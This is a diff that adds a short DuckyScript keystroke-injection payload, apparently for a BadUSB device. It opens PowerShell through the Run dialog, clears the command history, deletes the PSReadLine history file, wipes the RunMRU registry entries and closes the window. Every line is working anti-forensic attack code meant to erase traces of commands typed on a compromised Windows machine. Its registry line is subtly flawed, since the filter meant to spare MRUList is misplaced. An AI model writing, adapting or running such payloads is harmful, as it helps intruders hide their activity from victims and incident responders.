@@ -1,0 +1,19 @@
+GUI r
+DELAY 500
+STRING powershell -NoExit
+ENTER
+DELAY 1000
+
+STRING Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+ENTER
+DELAY 500
+
+STRING Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU').PSObject.Properties.Name | Where-Object { $_ -ne 'MRUList' }
+ENTER
+DELAY 1000
+
+ALT F4
